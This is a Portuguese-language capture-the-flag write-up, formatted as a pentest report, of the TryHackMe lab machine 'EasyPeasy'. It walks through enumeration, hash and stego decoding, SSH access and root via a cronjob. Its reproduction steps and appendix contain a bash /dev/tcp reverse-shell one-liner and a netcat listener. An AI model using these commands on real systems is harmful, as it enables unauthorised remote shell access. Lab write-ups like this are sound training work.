# 1 — Visão geral da metodologia

1. **Objetivo:** entregar evidência reprodutível, impacto claro e recomendações acionáveis.
    
2. **Estrutura:** Metadados → Executive Summary → Escopo & Limitações → Metodologia → Evidências / PoC → Impacto & Severidade → Reproduzir passo-a-passo → Recomendações (curtas e técnicas) → Apêndice técnico (comandos, outputs, screenshots).
    
3. **Princípios:** ser conciso para gestores (1 page) e exaustivo para técnicos (apêndice). Documentar tudo (comandos, outputs, prints) — “se não está documentado, não existe”.
    

---

# Report — Máquina: `EasyPeasy` — `10.201.55.60`

- **Fonte:** THM
    
- **Data:** `2025-11-13`
    
- **Autor:** Enrico Moreno
    
- **Nível:** easy
    
- **Tempo gasto:** 2h 30m
    

---

## 1) Executive summary (1–3 linhas)

A aplicação possuía diretórios ocultos acessíveis via brute-force, permitindo exposição de hashes, credenciais ofuscadas e arquivos sensíveis. A exploração levou a acesso SSH ao sistema e posterior escalonamento de privilégios via cronjob mal configurado, resultando na obtenção da **root flag**.

---

## 2) Escopo e limitações

- **Alvo(s) testados:**
    
    - `http://10.201.55.60/`
        
    - `http://10.201.55.60/hidden/`
        
    - `http://10.201.55.60/hidden/whatever/`
        
    - `http://10.201.55.60:65524/`
        
- **Ferramentas autorizadas:**
    
    - Kali Linux, nmap, gobuster, curl, base64, setghide, rot13, netcat.
        
- **Limitações:**
    
    - Sem brute force de credenciais além do necessário para decodificação.
        
    - Sem pivoting.
        
    - Apenas exploração no host alvo.
        

---

## 3) Metodologia aplicada

- Recon inicial com nmap.
    
- Enumeração de diretórios com gobuster.
    
- Análise manual de código-fonte HTML.
    
- Decodificação de base64, hash e formato Gost.
    
- Extração de dados ocultos com **steghide**.
    
- Login SSH com credenciais obtidas.
    
- Enumeração local do sistema e análise de cronjobs.
    
- Execução de reverse shell via cronjob para PrivEsc.
    
- Coleta de flags.
    

---

## 4) Achado principal — Diretórios ocultos → Credenciais → Cronjob PrivEsc

**Vulnerabilidade:** Exposição de diretórios ocultos + arquivos sensíveis + credenciais embutidas + cronjob vulnerável.  
**Local / Endpoint:**

- `/hidden/`, `/hidden/whatever/`, `/n0th1ng3ls3m4tt3r/`
    
- `/robots.txt` (porta 65524)  
    **Prova curta (PoC):**
    

`gobuster dir -u http://10.201.55.60/ -w /usr/share/dirb/wordlists/common.txt`

**Flag / Artefato:**

- Flag 1: obtida via base64.
    
- Flag 2: hash no robots.txt.
    
- User credentials via stego (Gost + binário).
    
- Root flag via cronjob exploit.
    

---

## 5) Evidências / PoC (resumo)

### 1) Nmap encontrando portas relevantes

`PORT      STATE SERVICE VERSION 80/tcp    open  http    nginx 1.16.1 6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 65524/tcp open  http    Apache httpd 2.4.43 (Ubuntu)`

### 2) Gobuster encontrando diretório oculto

`/hidden`

### 3) Gobuster em /hidden

`/hidden/whatever`

### 4) Código-fonte contendo base64

→ Decodificação revelou a **primeira flag**.

### 5) robots.txt (porta 65524)

→ continha uma **hash (Gost)** → senha usada para steghide.

### 6) Steghide

→ extração de username e senha em binário.

### 7) SSH login

→ acesso como usuário.

### 8) Cronjob fraco → reverse shell

→ acesso root e obtenção da última flag.

---

## 6) Impacto & Severidade (justifique)

**Severidade:** Alta  
**Justificativa:** A exposição de diretórios ocultos e arquivos sensíveis permitiu acesso a credenciais, manipulação de esteganografia e login SSH. A existência de um cronjob executado como root permitiu a execução arbitrária de comandos, levando à **tomada completa do sistema**.

---

## 7) Reproduzir (passo-a-passo reprodutível)

1. **Scan inicial**
    
    `nmap -sC -sV -oN nmap.txt 10.201.55.60`
    
2. **Brute force inicial**
    
    `gobuster dir -u http://10.201.55.60/ -w /usr/share/dirb/wordlists/common.txt`
    
3. **Enumeration de subdiretórios**
    
    `gobuster dir -u http://10.201.55.60/hidden/ -w /usr/share/dirb/wordlists/common.txt`
    
4. **Decodificação de base64 encontrada no código**
    
    `echo "<BASE64>" | base64 -d`
    
5. **Acesso à porta 65524**
    
    `curl http://10.201.55.60:65524/robots.txt`
    
6. **Decodificação de hash (Gost)**  
    → Usada como senha no steghide.
    
7. **Extração de esteganografia**
    
    `steghide extract -sf image.jpg`
    
8. **Login SSH com credenciais obtidas**
    
    `ssh user@10.201.55.60 -p 6498`
    
9. **Enumeração**
    
    `cat /etc/crontab`
    
10. **Inserção de reverse shell via cronjob**
    

`bash -i >& /dev/tcp/<SEU-IP>/4444 0>&1`

11. **Start listener**
    

`nc -lvnp 4444`

12. **Acesso root**  
    → Coletar flag em `/root/root.txt`.
    

---

## 8) Recomendações (rápidas para gestor) — 3 bullets

- Remover diretórios ocultos e arquivos sensíveis do ambiente de produção.
    
- Aplicar hardening completo do SSH e serviços web.
    
- Revisar cronjobs com privilégios elevados e remover execuções arbitrárias.
    

---

## 9) Recomendações técnicas (passo-a-passo)

- **Webserver:** remover diretórios não utilizados, desabilitar listagem e garantir sanitização de arquivos.
    
- **Aplicação:** evitar inserir credenciais ou hashes em HTML.
    
- **Steganografia:** nunca armazenar chaves ou senhas escondidas em mídia.
    
- **SSH:** usar senhas fortes, MFA, e restringir acesso por IP.
    
- **Cronjobs:** garantir permissão mínima, verificar caminhos absolutos e bloquear escrita por usuários comuns.
    

---

## 10) Apêndice técnico (comandos completos, outputs, screenshots)

### Nmap

`nmap -sC -sV -oN nmap_initial.txt 10.201.55.60`

### Gobuster

`gobuster dir -u http://10.201.55.60/ -w /usr/share/dirb/wordlists/common.txt`

### Esteganografia

`steghide extract -sf image.jpg`

### Reverse shell (cronjob)

`bash -i >& /dev/tcp/<SEU-IP>/4444 0>&1`


## Arquivos

![](easyPeasy_Nmap.txt)

![](gobuster_results_EasyPeasy.txt)

---


## 11) Lições aprendidas / follow-up

- Melhorar reconhecimento de esteganografia e formatos de hash.
    
- Revisar técnicas de PrivEsc baseadas em cronjobs.
    
- Sugerir retest após correção, idealmente em 15 dias.
    

---
